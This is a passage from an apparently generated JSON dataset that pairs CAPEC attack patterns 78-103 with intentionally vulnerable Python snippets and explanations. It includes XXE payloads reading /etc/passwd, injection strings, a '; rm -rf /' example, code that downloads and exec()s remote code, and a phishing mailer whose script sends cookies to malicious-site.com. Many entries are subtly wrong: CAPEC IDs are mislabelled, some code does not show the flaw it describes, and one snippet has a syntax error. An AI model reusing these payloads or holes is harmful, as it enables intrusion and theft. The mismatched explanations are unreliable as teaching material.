        "description": "This Python code snippet demonstrates a vulnerability where a user-controlled environment variable ('DEBUG') is directly used to control the application's business logic without any sanitization. The code checks the value of the 'DEBUG' environment variable and sets the 'debug_mode' flag accordingly. If an attacker can manipulate the 'DEBUG' environment variable, they can control the debug mode of the application, potentially exposing sensitive information or altering the application's behavior. This example embodies the main idea of CAPEC-15 (Manipulating User-Controlled Variables) and is related to CWE-15 (External Control of System or Configuration Setting) and CWE-473 (PHP External Variable Modification), highlighting the risks of using untrusted input to control critical application settings."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Validate input before canonicalization (CWE-180)\n    if not file_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path')\n    \n    # Canonicalize the path\n    canonical_path = os.path.realpath(file_path)\n    \n    # Validate the canonicalized path\n    if not canonical_path.startswith('/safe/directory/'):\n        raise ValueError('Invalid file path after canonicalization')\n    \n    # Read the file\n    with open(canonical_path, 'r') as file:\n        return file.read()\n\n# Example usage\nuser_input = '../etc/passwd'  # This input attempts a path traversal attack\ntry:\n    content = read_file(user_input)\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Using Escaped Slashes in Alternate Encoding' and associated CWEs. The function `read_file` is intended to read a file from a specified path. It first validates the input path to ensure it starts with '/safe/directory/' (CWE-180). However, this validation occurs before canonicalization, which can be bypassed by using alternate encodings or special characters like '../' to perform a path traversal attack (CWE-22). The code then canonicalizes the path using `os.path.realpath` and re-validates it to ensure it still starts with '/safe/directory/'. If the path is invalid after canonicalization, it raises a ValueError. This demonstrates the importance of proper order in validation and canonicalization to prevent security issues."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    # Improper input validation and handling of alternate encoding\n    if '..' in file_path or '\\' in file_path or '/' in file_path:\n        raise ValueError('Invalid file path')\n    \n    # Attempt to open the file\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Example usage\ntry:\n    content = read_file('..\\etc\\passwd')\n    print(content)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a vulnerable file reading function that improperly handles alternate encodings of slashes and does not correctly validate input paths. The function `read_file` attempts to check for invalid paths by looking for '..', '\\', and '/' in the input path. However, this simplistic check can be bypassed by using alternate encodings or other techniques. The code is vulnerable to path traversal attacks (CWE-22) and improper input validation (CWE-20). An attacker could exploit these weaknesses to access sensitive files on the system."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "import re\n\ndef is_valid_input(user_input):\n    # Validate input using a regex pattern\n    pattern = re.compile(r'^[a-zA-Z0-9]+$')\n    if pattern.match(user_input):\n        return True\n    return False\n\n# Example of a naive decoder that accepts overlong UTF-8 sequences\ndef naive_utf8_decoder(input_bytes):\n    try:\n        return input_bytes.decode('utf-8')\n    except UnicodeDecodeError:\n        return None\n\n# User input that is overlong UTF-8 encoded\nuser_input = b'\\xc0\\xaf'  # Overlong encoding for '/'\n\n# Validate the input before decoding (Incorrect Behavior Order)\nif is_valid_input(user_input.decode('utf-8', 'ignore')):\n    decoded_input = naive_utf8_decoder(user_input)\n    if decoded_input:\n        print(f\"Valid input: {decoded_input}\")\n    else:\n        print(\"Invalid UTF-8 sequence\")\nelse:\n    print(\"Invalid input format\")",
        "description": "This Python code snippet demonstrates a vulnerability where UTF-8 encoding is used to bypass validation logic. The `is_valid_input` function validates the input using a regex pattern that only allows alphanumeric characters. However, the input is validated before it is properly decoded, which is an example of CWE-180 (Incorrect Behavior Order: Validate Before Canonicalize). The `naive_utf8_decoder` function represents a naive decoder that accepts overlong UTF-8 sequences, which can be exploited to bypass the validation logic. The user input `b'\\xc0\\xaf'` is an overlong encoding for the '/' character, which can bypass the validation and be interpreted incorrectly, demonstrating the main idea of the CAPEC."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import logging\n\n# Setup logging\nlogging.basicConfig(filename='webserver.log', level=logging.INFO)\n\n# Function to log user input\ndef log_user_input(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError('Invalid input type')\n    \n    # CWE-116: Improper Encoding or Escaping of Output\n    # CWE-117: Improper Output Neutralization for Logs\n    # CWE-93: Improper Neutralization of CRLF Sequences\n    sanitized_input = user_input.replace('\\n', '').replace('\\r', '').replace('%0a', '').replace('%0d', '')\n    \n    # Log the sanitized input\n    logging.info(f'User input: {sanitized_input}')\n\n# Example usage\ntry:\n    user_input = \"Hello, world!\\nInjected log entry\"\n    log_user_input(user_input)\nexcept ValueError as e:\n    print(e)",
        "description": "This Python code snippet demonstrates a logging function that logs user input to a web server log file. The function `log_user_input` first validates the input to ensure it is a string (CWE-20: Improper Input Validation). It then sanitizes the input by removing newline characters and CRLF sequences (CWE-116: Improper Encoding or Escaping of Output, CWE-117: Improper Output Neutralization for Logs, CWE-93: Improper Neutralization of CRLF Sequences). This prevents an attacker from injecting malicious log entries that could tamper with the web server logs. The sanitized input is then logged using Python's logging module. This code embodies the main idea of CAPEC- Web Server Logs Tampering by demonstrating how to prevent log tampering through proper input validation and sanitization."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (potentially from an untrusted source)\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<root>\n  <data>&xxe;</data>\n</root>\n'''\n\ntry:\n    # Parse the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(root.find('data').text)\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to improper handling of XML data, specifically CWE-611 (Improper Restriction of XML External Entity Reference). The code parses an XML document that includes an external entity reference, which can lead to XML External Entity (XXE) attacks. The XML data contains a DOCTYPE declaration that defines an entity 'xxe' which references the system file '/etc/passwd'. When the XML is parsed without proper validation, the external entity is resolved, potentially exposing sensitive information. This example highlights the importance of validating and sanitizing XML input to prevent such vulnerabilities."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <password>admin123</password>\n    </user>\n    <user>\n        <username>user</username>\n        <password>user123</password>\n    </user>\n</users>\n'''\n\n# Parse the XML data\nroot = ET.fromstring(xml_data)\n\n# User input (potentially malicious)\nuser_input = \"' or '1'='1\"\n\n# Constructing the XPath query using user input\nxpath_query = f\".//user[username/text()='{user_input}']/password/text()\"\n\n# Executing the XPath query\nresult = root.findall(xpath_query)\n\n# Output the result\nfor password in result:\n    print(password.text)",
        "description": "This Python code snippet demonstrates an XPath Injection vulnerability. It parses a sample XML data containing user credentials and constructs an XPath query using unsanitized user input. The user input is directly embedded into the XPath expression, allowing an attacker to manipulate the query structure. In this example, the input \"' or '1'='1\" is used to bypass authentication checks, potentially retrieving all passwords from the XML database. This code highlights the importance of proper input validation and neutralization to prevent XPath Injection attacks."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "import lxml.etree as ET\n\n# User input that is not properly sanitized\nuser_input = \"' or '1'='1\"\n\n# Constructing an XQuery expression using unsanitized user input\nxquery = f\"/users/user[username='{user_input}']/data\"\n\n# Loading an example XML document\nxml_data = '''\n<users>\n    <user>\n        <username>admin</username>\n        <data>Admin Data</data>\n    </user>\n    <user>\n        <username>guest</username>\n        <data>Guest Data</data>\n    </user>\n</users>\n'''\n\ndoc = ET.fromstring(xml_data)\n\n# Executing the XQuery expression\nresult = doc.xpath(xquery)\n\n# Output the result\nprint(result)\n",
        "description": "This Python code snippet demonstrates an XQuery Injection vulnerability. The code constructs an XQuery expression using unsanitized user input, which can be manipulated by an attacker to alter the query's structure. In this example, the user input is designed to always return true (' or '1'='1'), potentially exposing all user data. The code loads an XML document and executes the constructed XQuery expression, illustrating how improper neutralization of input can lead to security vulnerabilities. This example embodies the main idea of CAPEC-74 and related CWEs, highlighting the importance of proper input validation and neutralization to prevent injection attacks."
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "import requests\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    if not query:\n        return jsonify({'error': 'No query provided'}), 400\n    # CWE-20: Improper Input Validation\n    if '<script>' in query:\n        return jsonify({'error': 'Invalid input'}), 400\n    # CWE-116: Improper Encoding or Escaping of Output\n    response = f\"<div>Search results for: {query}</div>\"\n    return response\n\n@app.route('/ajax', methods=['POST'])\ndef ajax():\n    data = request.json\n    if not data or 'url' not in data:\n        return jsonify({'error': 'Invalid data'}), 400\n    # CWE-348: Use of Less Trusted Source\n    url = data['url']\n    try:\n        # CWE-79: Cross-site Scripting (XSS)\n        response = requests.get(url)\n        return jsonify({'content': response.text})\n    except requests.exceptions.RequestException as e:\n        return jsonify({'error': str(e)}), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application with two endpoints: '/search' and '/ajax'. The '/search' endpoint takes a query parameter and returns a search result. It includes basic input validation to prevent XSS attacks (CWE-20) and improper encoding/escaping of output (CWE-116). The '/ajax' endpoint accepts a JSON payload with a URL and fetches content from that URL, demonstrating the use of a less trusted source (CWE-348) and potential XSS vulnerabilities (CWE-79). This code embodies the main idea of AJAX Footprinting by showing how frequent client-server interactions can be exploited to gather information and identify vulnerabilities."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    user_agent = request.headers.get('User-Agent')\n    response = make_response(f'<html><body><h1>Welcome!</h1><p>Your user agent is: {user_agent}</p></body></html>')\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that reads the 'User-Agent' HTTP header from incoming requests and includes it in the HTML response without proper validation or sanitization. This demonstrates the vulnerability described in the CAPEC 'XSS Through HTTP Headers'. Specifically, it embodies CWE-80 and CWE-79 by not neutralizing special characters in the 'User-Agent' header, which could lead to cross-site scripting (XSS) attacks. An attacker could exploit this by sending a malicious 'User-Agent' header containing script tags, which would then be executed in the context of the web page served to other users."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "from flask import Flask, request, redirect, url_for\n\napp = Flask(__name__)\n\n# Simulated user roles\nuser_roles = {\n    'user1': 'admin',\n    'user2': 'user'\n}\n\n# Simulated session\nsession = {\n    'username': 'user2'\n}\n\n@app.route('/admin')\ndef admin_panel():\n    # Improper authorization check\n    if session['username'] not in user_roles or user_roles[session['username']] != 'admin':\n        return 'Access Denied', 403\n    return 'Welcome to the admin panel'\n\n@app.route('/admin/settings')\ndef admin_settings():\n    # No authorization check\n    return 'Admin settings page'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate a web application vulnerable to forceful browsing. The application has two routes: '/admin' and '/admin/settings'. The '/admin' route performs an improper authorization check, while the '/admin/settings' route lacks any authorization check. An attacker can directly access '/admin/settings' without proper authorization, exemplifying the 'Forceful Browsing' attack described in CAPEC-111. The code also touches on related CWEs such as CWE-425 (Direct Request), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to OS Command Injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a basic example of OS Command Injection vulnerability. The function `execute_command` takes user input and constructs an OS command string without proper validation or neutralization of special elements. The `os.system` function then executes this command. An attacker can exploit this by providing malicious input, such as `; rm -rf /`, to execute arbitrary commands on the underlying operating system. This example embodies the main idea of CAPEC-88 and related CWEs, particularly CWE-78 (Improper Neutralization of Special Elements used in an OS Command) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "import socket\nimport requests\n\n# CWE-346: Origin Validation Error\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n# CWE-494: Download of Code Without Integrity Check\n\ndef get_ip_from_hostname(hostname):\n    return socket.gethostbyname(hostname)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-79: Improper Neutralization of Input During Web Page Generation\n\nhostname = 'trustedbank.com'\ntrusted_ip = get_ip_from_hostname(hostname)\n\n# Simulate a pharming attack by redirecting to a malicious IP\nmalicious_ip = '192.168.1.100'\n\n# Incorrectly assuming the IP is trusted\nif trusted_ip == malicious_ip:\n    # CWE-494: Downloading code without integrity check\n    response = requests.get(f'http://{malicious_ip}/malicious_code.py')\n    exec(response.text)\nelse:\n    print('IP address does not match trusted source.')",
        "description": "This Python code snippet demonstrates a simplified version of a pharming attack. The code first resolves the IP address of a supposedly trusted hostname ('trustedbank.com'). It then simulates a pharming attack by redirecting to a malicious IP address ('192.168.1.100'). The code incorrectly assumes the IP is trusted and proceeds to download and execute code from the malicious IP without performing any integrity checks. This snippet embodies the main idea of a pharming attack by showing how an attacker can redirect traffic to a malicious site and execute harmful code, leveraging several related CWEs such as origin validation errors, reliance on reverse DNS resolution, and downloading code without integrity checks."
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "import socket\n\n# Simulated vulnerable authentication protocol\nclass VulnerableAuthProtocol:\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n    def challenge_response(self, challenge):\n        # Incorrect implementation of authentication algorithm (CWE-303)\n        return challenge + self.secret_key\n\n# Simulated attacker\nclass Attacker:\n    def __init__(self, target_ip, target_port):\n        self.target_ip = target_ip\n        self.target_port = target_port\n\n    def reflection_attack(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.target_ip, self.target_port))\n            challenge = 'random_challenge'\n            s.sendall(challenge.encode())\n            response = s.recv(1024).decode()\n            # Reflection attack: send the same response back (CWE-301)\n            s.sendall(response.encode())\n            final_response = s.recv(1024).decode()\n            print(f'Final response from server: {final_response}')\n\n# Simulated server\nclass Server:\n    def __init__(self, secret_key):\n        self.auth_protocol = VulnerableAuthProtocol(secret_key)\n\n    def handle_client(self, client_socket):\n        challenge = client_socket.recv(1024).decode()\n        response = self.auth_protocol.challenge_response(challenge)\n        client_socket.sendall(response.encode())\n        reflected_response = client_socket.recv(1024).decode()\n        if reflected_response == response:\n            client_socket.sendall('Access Granted'.encode())\n        else:\n            client_socket.sendall('Access Denied'.encode())\n\n# Example usage\nif __name__ == '__main__':\n    secret_key = 'secret'\n    server = Server(secret_key)\n    attacker = Attacker('localhost', 12345)\n\n    # This would normally be run in separate threads or processes\n    import threading\n    server_thread = threading.Thread(target=lambda: server.handle_client(socket.socket(socket.AF_INET, socket.SOCK_STREAM)))\n    server_thread.start()\n    attacker.reflection_attack()\n    server_thread.join()",
        "description": "This Python code snippet demonstrates a vulnerable authentication protocol susceptible to a reflection attack (CAPEC-301). The `VulnerableAuthProtocol` class simulates an incorrect implementation of an authentication algorithm (CWE-303). The `Attacker` class performs a reflection attack by sending a challenge to the server, receiving the response, and then reflecting the same response back to the server to gain unauthorized access. The `Server` class handles the client connection and checks if the reflected response matches the expected response, granting access if they match. This code highlights the vulnerability in simple challenge-response authentication protocols that can be exploited by reflection attacks."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/display', methods=['GET'])\ndef display():\n    user_input = request.args.get('input', '')\n    # Vulnerable code: directly embedding user input in an IMG tag without proper neutralization\n    html_content = f'<img src=\"{user_input}\" />'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks through the improper neutralization of script in attributes of IMG tags. The application takes user input from a query parameter 'input' and directly embeds it into an IMG tag's 'src' attribute without any sanitization or validation. This can allow an attacker to inject malicious scripts, leading to XSS attacks. The code embodies the main idea of the deprecated CAPEC-18 and related CWEs, such as CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) and CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page)."
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "import sys\n\n# Function to simulate forced integer overflow\n\ndef allocate_memory(size):\n    # Simulate an integer overflow by using a large value\n    if size > sys.maxsize:\n        size = size - sys.maxsize - 1\n    \n    # Allocate memory based on the (potentially overflowed) size\n    try:\n        buffer = bytearray(size)\n        print(f\"Allocated {size} bytes of memory.\")\n    except MemoryError:\n        print(\"Memory allocation failed.\")\n\n# Example usage\nuser_input = int(input(\"Enter the size of memory to allocate: \"))\nallocate_memory(user_input)\n",
        "description": "This Python code snippet demonstrates a forced integer overflow vulnerability. The `allocate_memory` function takes a size parameter and simulates an integer overflow by adjusting the size if it exceeds the maximum value for an integer (`sys.maxsize`). This can lead to incorrect memory allocation, potentially causing a buffer overflow. The code represents the main idea of CAPEC-190 (Forced Integer Overflow) and incorporates related CWEs such as CWE-190 (Integer Overflow or Wraparound) and CWE-680 (Integer Overflow to Buffer Overflow). The user input is taken to determine the size of memory to allocate, which can be manipulated to trigger the overflow and lead to unexpected behavior."
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to log user input\ndef log_user_action(user_input):\n    # CWE-117: Improper Output Neutralization for Logs\n    # CWE-75: Failure to Sanitize Special Elements into a Different Plane\n    # CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n    logging.info(f'User action: {user_input}')\n\n# Example user input that could be malicious\nuser_input = \"User logged in; DROP TABLE users; --\"\nlog_user_action(user_input)\n\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-779: Logging of Excessive Data\nsensitive_info = \"User password: secret_password\"\nlogging.info(f'Sensitive info: {sensitive_info}')",
        "description": "This Python code snippet demonstrates a logging mechanism that is vulnerable to log injection, tampering, and forging attacks. The `log_user_action` function logs user input directly without proper sanitization or neutralization, making it susceptible to CWE-117, CWE-75, and CWE-150. Additionally, sensitive information is logged (CWE-532), and excessive data logging is shown (CWE-779). This code highlights the risks of improper log handling and the potential for attackers to manipulate log files, mislead audits, and cover their tracks."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\n# Create a context with improper SSL settings\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\ncontext.verify_mode = ssl.CERT_NONE  # CWE-287: Improper Authentication\n\n# Create a socket and wrap it with SSL\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8443))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    ssl_socket = context.wrap_socket(client_socket, server_side=True)\n    data = ssl_socket.recv(1024)\n    print(f\"Received data: {data}\")  # CWE-300: Channel Accessible by Non-Endpoint\n    # CWE-294: Authentication Bypass by Capture-replay\n    ssl_socket.sendall(data)  # Echo back the data\n    ssl_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable server setup that embodies the 'Adversary in the Middle (AiTM)' attack pattern. The server uses an SSL context with improper settings (CWE-287: Improper Authentication) by not verifying client certificates (context.verify_mode = ssl.CERT_NONE). This allows an adversary to intercept and manipulate the communication channel (CWE-300: Channel Accessible by Non-Endpoint). The server simply echoes back any received data, which can be exploited for capture-replay attacks (CWE-294: Authentication Bypass by Capture-replay). This setup makes it easy for an attacker to place themselves within the communication channel and alter or obtain data from transactions."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "import requests\n\n# URL of the WSDL file\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Fetch the WSDL file\nresponse = requests.get(wsdl_url)\n\n# Check if the WSDL file is accessible\nif response.status_code == 200:\n    wsdl_content = response.text\n    print('WSDL file content:')\n    print(wsdl_content)\n\n    # Example of extracting sensitive information from WSDL\n    if 'password' in wsdl_content or 'secret' in wsdl_content:\n        print('Sensitive information found in WSDL file!')\nelse:\n    print('Failed to access WSDL file')",
        "description": "This Python code snippet demonstrates a basic WSDL scanning attack. It fetches the WSDL file from a specified URL and checks if it is accessible. If the WSDL file is accessible, it prints the content of the WSDL file. The code then searches for sensitive information such as 'password' or 'secret' within the WSDL content. This represents the CAPEC idea of scanning WSDL interfaces to reveal sensitive information, which can be used for further attacks. The code also highlights CWE-651 (Exposure of WSDL File Containing Sensitive Information) by showing how sensitive information can be exposed through the WSDL file."
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "import os\n\n# Function to read a file using a third-party library\ntry:\n    import third_party_lib\nexcept ImportError:\n    print(\"Error: Required third-party library is not available.\")\n    # Fallback to a less secure method\n    def read_file(file_path):\n        with open(file_path, 'r') as file:\n            return file.read()\nelse:\n    def read_file(file_path):\n        return third_party_lib.read_secure_file(file_path)\n\n# Main function\nif __name__ == \"__main__\":\n    file_path = \"example.txt\"\n    try:\n        content = read_file(file_path)\n        print(content)\n    except Exception as e:\n        print(f\"An error occurred: {e}\")",
        "description": "This Python code snippet demonstrates the CAPEC concept of 'Block Access to Libraries' by attempting to use a third-party library to read a file. If the library is not available (ImportError), it falls back to a less secure method of reading the file. This fallback could leave the system in an insecure state, as it does not handle the file as securely as the third-party library would. The code also touches on related CWEs: it uses a non-ubiquitous API (CWE-589) by relying on a third-party library that may not be present, and it includes functionality from an untrusted control sphere (CWE-829) by importing a third-party library."
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\n\n# Use of a weak cryptographic algorithm (CWE-327)\nkey = b'weakkey12345678'  # 128-bit key for AES\niv = b'1234567890123456'  # Weak IV (CWE-1204)\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypting data\nplaintext = b'This is a secret message'\nciphertext = cipher.encrypt(pad(plaintext, AES.block_size))\nprint(f'Ciphertext: {ciphertext}')\n\n# Decrypting data\ncipher = AES.new(key, AES.MODE_CBC, iv)\ndecrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)\nprint(f'Decrypted: {decrypted.decode()}')",
        "description": "This Python code snippet demonstrates the use of a weak cryptographic algorithm and a weak initialization vector (IV), which are common vulnerabilities in cryptographic implementations. The code uses the AES algorithm in CBC mode with a hardcoded, predictable key and IV. This makes the encryption susceptible to cryptanalysis attacks, as the key and IV are not sufficiently random or secure. The code encrypts and decrypts a plaintext message, showcasing how these vulnerabilities can be exploited to compromise the security of the encrypted data."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-601: URL Redirection to Untrusted Site\nphishing_url = 'http://malicious-site.com/login'\n\n# CWE-451: UI Misrepresentation of Critical Information\nemail_body = f\"\"\"\nDear User,\n\nPlease click the link below to verify your account:\n<a href='{phishing_url}'>Verify Account</a>\n\nThank you,\nTrusted Service\n\"\"\"\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-512: Spyware\nmalicious_code = \"<script>document.location='http://malicious-site.com/steal?cookie=' + document.cookie;</script>\"\nemail_body += malicious_code\n\nmsg = MIMEText(email_body, 'html')\nmsg['Subject'] = 'Account Verification'\nmsg['From'] = 'no-reply@trustedservice.com'\nmsg['To'] = 'victim@example.com'\n\n# Send the phishing email\ntry:\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(msg['From'], [msg['To']], msg.as_string())\n    print('Phishing email sent successfully.')\nexcept Exception as e:\n    print(f'Failed to send email: {e}')",
        "description": "This Python code snippet demonstrates a phishing attack by sending an email that appears to be from a trusted service. The email contains a link to a malicious site (CWE-601) and misrepresents critical information (CWE-451) by pretending to be a legitimate account verification request. Additionally, the email embeds malicious code (CWE-506) that steals the user's cookies (CWE-512) when the link is clicked. This code exemplifies how phishing attacks can be executed by combining social engineering with technical vulnerabilities."
    },
    {
        "capec_id": "99",
        "capec_name": "DEPRECATED: XML Parser Attack",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data (could be from an untrusted source)\nxml_data = '''\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n'''\n\ntry:\n    # Parse the XML data without proper validation\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"XML parsing error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-230 and CAPEC-231, specifically focusing on CWE-611 (Improper Restriction of XML External Entity Reference). The code parses an XML document that includes an external entity reference, which can lead to an XML External Entity (XXE) attack. The XML data contains a DOCTYPE declaration that defines an external entity 'xxe' pointing to the '/etc/passwd' file. When the XML is parsed without proper validation, the external entity is processed, potentially exposing sensitive information. This example highlights the importance of validating and sanitizing XML input from untrusted sources to prevent such vulnerabilities."
    },
    {
        "capec_id": "100",
        "capec_name": "Overflow Buffers",
        "code_snippet": "def vulnerable_function(input_data):\n    buffer = [0] * 10  # Fixed-size buffer\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # No bounds checking\n\n# Example usage\nuser_input = [1] * 15  # Input larger than buffer size\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function 'vulnerable_function' takes 'input_data' as an argument and attempts to copy its contents into a fixed-size buffer of 10 elements. However, there is no bounds checking to ensure that 'input_data' fits within the buffer. If 'input_data' is larger than the buffer, this will result in writing past the buffer's boundaries, leading to a buffer overflow. This example embodies the main idea of CAPEC-1000 (Overflow Buffers) and is related to CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer)."
    },
    {
        "capec_id": "101",
        "capec_name": "Server Side Include (SSI) Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET', 'POST'])\ndef vulnerable():\n    if request.method == 'POST':\n        user_input = request.form['user_input']\n        # Vulnerable to SSI Injection\n        response = render_template_string(user_input)\n        return response\n    return '''<form method='POST'>\n                <input type='text' name='user_input'>\n                <input type='submit'>\n              </form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic Flask web application that is vulnerable to Server Side Include (SSI) Injection. The application has a single route '/vulnerable' that accepts both GET and POST requests. When a POST request is made, the user input is taken from the form and directly rendered using Flask's render_template_string function without any sanitization or validation. This allows an attacker to inject SSI directives, which the server will execute, leading to potential arbitrary code execution and information disclosure. The code embodies the main idea of CAPEC-97 and related CWEs, such as improper neutralization of server-side includes, improper input validation, and injection vulnerabilities."
    },
    {
        "capec_id": "102",
        "capec_name": "Session Sidejacking",
        "code_snippet": "import http.client\nimport urllib.parse\n\n# Simulate a login request with credentials sent in cleartext\nconn = http.client.HTTPConnection('example.com')\nparams = urllib.parse.urlencode({'username': 'user', 'password': 'pass'})\nheaders = {'Content-type': 'application/x-www-form-urlencoded'}\nconn.request('POST', '/login', params, headers)\nresponse = conn.getresponse()\n\n# Print the response status and reason\nprint(response.status, response.reason)\n\n# Simulate capturing a session token from the response headers\nsession_token = response.getheader('Set-Cookie')\nprint('Captured session token:', session_token)\n\n# Use the captured session token to perform an authenticated request\nheaders = {'Cookie': session_token}\nconn.request('GET', '/sensitive-data', headers=headers)\nresponse = conn.getresponse()\n\n# Print the response status and reason\nprint(response.status, response.reason)\n\n# Print the sensitive data\nprint(response.read().decode())",
        "description": "This Python code snippet demonstrates a simplified version of a session sidejacking attack. It simulates a login request where credentials are sent in cleartext (CWE-319, CWE-523). The response from the server includes a session token, which is captured by the attacker. The attacker then uses this session token to impersonate the victim and access sensitive data (CWE-294, CWE-522). The code highlights the vulnerability of transmitting sensitive information without encryption and the potential for session hijacking when session tokens are not adequately protected."
    },
    {
        "capec_id": "103",
        "capec_name": "Clickjacking",
        "code_snippet": "from flask import Flask, render_template_string, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <head>\n        <title>Clickjacking Example</title>\n    </head>\n    <body>\n        <h1>Welcome to the vulnerable site</h1>\n        <iframe src=\"{{ url_for('malicious') }}\" width=\"500\" height=\"500\" style=\"opacity:0; position:absolute; top:0; left:0;\"></iframe>\n    </body>\n    </html>\n    ''')\n\n@app.route('/malicious')\ndef malicious():\n    return \"<h1>Malicious Content</h1><button onclick=\\\"alert('You clicked a hidden button!')\\\">Click me</button>\"\n\nif __name__ == '__main__':\n    app.run(debug=True)",
